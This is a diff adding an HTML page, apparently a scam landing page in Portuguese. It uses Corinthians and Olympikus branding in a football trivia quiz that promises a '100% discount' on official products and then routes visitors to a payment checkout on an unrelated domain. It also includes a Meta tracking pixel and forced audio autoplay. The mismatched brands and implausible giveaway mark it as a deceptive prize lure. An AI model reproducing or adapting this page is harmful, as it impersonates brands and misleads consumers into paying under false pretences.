@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+<!-- Meta Pixel Code -->
+<script async="" src="js/fbevents.js"></script><script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '890474289346316');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=890474289346316&ev=PageView&noscr"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Desafio Corinthians</title>
+    <link rel="stylesheet" href="css/styles.css">
+
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&amp;display=swap" rel="stylesheet">
+<script async="" defer="" src="js/pixel.js"></script><script async="" defer="" src="js/pixel_1.js"></script></head>
+    
+ 
+<body>
+    
+ <audio id="trilha" ">
+    <source src=" type="audio/mpeg">
+    Seu navegador não suporta o elemento de áudio.
+  </audio>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      var trilha = document.getElementById('trilha');
+      
+      // Set volume to 0.01 and log the volume level
+      trilha.volume = 0.05;
+      console.log("Volume set to: " + trilha.volume);
+
+      function tentarTocarAudio() {
+        trilha.play().then(function() {
+          // Log success if the audio starts playing
+          console.log("Reprodução automática bem-sucedida.");
+        }).catch(function(error) {
+          // Log failure and try again after 1 second
+          console.log("Reprodução automática falhou. Tentando novamente...");
+          setTimeout(tentarTocarAudio, ); // Tenta novamente após 1 segundo
+        });
+      }
+
+      tentarTocarAudio();
+    });
+  </script>
+  
+  
+    <div class="header">
+        <img src="images/olympikus-logo-7-1.png" alt="Logo">
+    </div>
+
+    <div class="titllee">
+        <h1>Bem-vindo ao <br> Desafio da Seleção!</h1>
+    </div>
+
+
+    <div class="container ">
+        <div class="content ">
+            <!-- Tela inicial do quiz -->
+            <div id="start-screen" class="quiz-screen ">
+
+                <p>Participe do nosso emocionante <strong>Desafio de comemoração pela Copa de 1998</strong> e ganhe a chance de garantir um produto oficial com <strong>100% de desconto.</strong>
+                    <br><br>
+                    Ao completar o desafio com sucesso, você terá acesso ao site oficial com os <strong>produtos disponíveis para resgate.</strong>
+                </p>
+                <button id="start-quiz" class="btn">COMEÇAR</button>
+
+            </div>
+
+            <!-- Pergunta 1 -->
+            <div id="question-1" class="quiz-screen hidden">
+                <h2>Desafio Seleção</h2>
+                <p>  Quantas vezes o Brasil já venceu a Copa do Mundo? </p>
+                <div class="options">
+                    <button class="option incorrect">3</button>
+                    <button class="option correct">5</button>
+                    <button class="option incorrect">6</button>
+                </div>
+                <button class="btn next-btn">Próxima Pergunta</button>
+                
+                <div class="valor-total">
+                    <p>Desconto total: 0%</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 2 -->
+            <div id="question-2" class="quiz-screen hidden">
+                <h2>Desafio Seleção</h2>
+
+                <p>Quem é o maior artilheiro nas copas pelo Brasil? </p>
+                <div class="options">
+                    <button class="option incorrect">Richarlisson</button>
+                    <button class="option correct">Ronaldo</button>
+                    <button class="option incorrect">Neymar</button>
+                </div>
+                <button class="btn next-btn">Próxima Pergunta</button>
+                
+                <div class="valor-total">
+                    <p>Desconto total: 25%</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 3 -->
+            <div id="question-3" class="quiz-screen hidden">
+                <h2>Desafio Seleção</h2>
+                <p>Qual é o mascote oficial da Seleção Brasileira?</p>
+                <div class="options">
+                    <button class="option incorrect">Leão</button>
+                    <button class="option incorrect">Águia</button>
+                    <button class="option correct">Canarinho</button>
+                </div>
+                <button class="btn next-btn">Próxima Pergunta</button>
+                
+                <div class="valor-total">
+                    <p>Desconto total: 50%</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 4 -->
+            <div id="question-4" class="quiz-screen hidden">
+                <h2>Desafio Seleção</h2>
+                <p>Quem é o atual técnico da Seleção Brasileira?</p>
+                <div class="options">
+                    <button class="option incorrect">Tite</button>
+                    <button class="option correct">Dorival Jr.</button>
+                    <button class="option incorrect">Felipão</button>
+                </div>
+                <button class="btn next-btn">Próxima Pergunta</button>
+                
+                <div class="valor-total">
+                    <p>Desconto total: 75%</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 5 -->
+            <div id="question-5" class="quiz-screen hidden">
+                <h2>Desafio Seleção</h2>
+
+                <p>A seleção venceu as Olimpíadas quantas vezes, garantindo a medalha de ouro?</p>
+                <div class="options">
+                    <button class="option correct">1</button>
+                    <button class="option incorrect">3</button>
+                    <button class="option incorrect">2</button>
+                </div>
+                <button class="btn next-btn">Próxima Pergunta</button>
+                
+                <div class="valor-total">
+                    <p>Desconto total: 100%</p>
+                </div>
+            </div>
+
+
+
+            <!-- Tela de conclusão do quiz -->
+            <div id="end-screen" class="quiz-screen hidden">
+                <h2>Parabéns!</h2>
+                <p class="p-resgate">Você acaba de ganhar 100% de desconto em produtos oficiais Corinthians!</p>
+                <a href="https://pay.carrinhofinalizadozeroone.com/checkout/2c67cc67-89c9-4ff6-9ad3-a03af92eb8dc" class="btn btn-resgate">RESGATAR</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- popUp para selecionar alguma pergunta -->
+    <div class="selecione-resposta hidden ">
+        <p class="selecione-resposta-p">selecione uma resposta!</p>
+        <button class="btn back-btn">voltar</button>
+    </div>
+
+
+    <!-- popUp para selecionar alguma pergunta -->
+    <div class="dica ">
+        <div class="dica-1 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
+            <p class="dica-p">
+                
+            </p>
+            <button class="btn back-btn">TENTE NOVAMENTE</button>
+        </div>
+
+        <div class="dica-2 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
+            <p class="dica-p">
+                
+            <button class="btn back-btn">TENTE NOVAMENTE</button>
+        </p></div>
+
+        <div class="dica-3 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
+            <p class="dica-p">
+               
+            </p>
+            <button class="btn back-btn">TENTE NOVAMENTE</button>
+        </div>
+
+        <div class="dica-4 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
+            <p class="dica-p">
+                
+            </p>
+            <button class="btn back-btn">TENTE NOVAMENTE</button>
+        </div>
+
+        <div class="dica-5 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio</p>
+            <p class="dica-p">
+                
+            </p>
+            <button class="btn back-btn">TENTE NOVAMENTE</button>
+        </div>
+    </div>
+
+    <div class="footer">
+
+    </div>
+    <script src="js/script.js"></script>
+
+<script src="js/latest.js" async="" defer=""></script>
+
+</body></html>
